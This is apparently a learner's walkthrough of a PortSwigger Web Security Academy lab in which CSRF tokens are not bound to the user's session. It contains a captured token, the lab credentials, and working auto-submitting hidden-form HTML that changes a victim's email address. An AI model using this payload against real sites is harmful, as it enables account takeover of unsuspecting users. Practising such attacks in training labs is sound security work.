This lab's email change functionality is vulnerable to CSRF. It uses tokens to try to prevent CSRF attacks, but they aren't integrated into the site's session handling system.

To solve the lab, use your exploit server to host an HTML page that uses a CSRF attack to change the viewer's email address.

You have two accounts on the application that you can use to help design your attack. The credentials are as follows:

- `wiener:peter`
- `carlos:montoya`

---

1. Log into user to obtain token
2. Use token to change the second user's email.


```php
email=test%40test.com&csrf=CQsVzkB7dcWbPqassMZMhBuv6k0l6iZU
```

```html
<html>
	<body>
		<h1>Hello World!</h1>
		<iframe style="display:none" name="csrf-iframe"></iframe>
		<form action="https://bank.com/email/change/" method="post" target="csrf-iframe" id="csrf-form">
			<input type="hidden" name="email" value="test@test.com">
		</form>
		<script>
		document.getElementById("csrf-from").submit()
		</script>
	</body>
</html>
```

`<input type="hidden" name="csrf" value="1234">`
`https://0a6700ec0437691e80be1cf7005100b6.web-security-academy.net/`

- From burp repeater you can copy the URL of the request:
`https://0a6700ec0437691e80be1cf7005100b6.web-security-academy.net/my-account/change-email`

Exploit:
```html
<html>
	<body>
		<h1>Hello World!</h1>
		<iframe style="display:none" name="csrf-iframe"></iframe>
		<form action="https://0a6700ec0437691e80be1cf7005100b6.web-security-academy.net/my-account/change-email" method="POST" target="csrf-iframe" id="csrf-form">
			<input type="hidden" name="email" value="test12@test.com">
			<input type="hidden" name="csrf" value="CQsVzkB7dcWbPqassMZMhBuv6k0l6iZU">
		</form>
		<script>document.getElementById("csrf-form").submit()</script>	
	</body>
</html>
```

- The CSRF is regenerated every time it's used, so i opened a private window in firefox, logged in with carlos, and inspected element over the change email input location, i could then copy the CSRF.



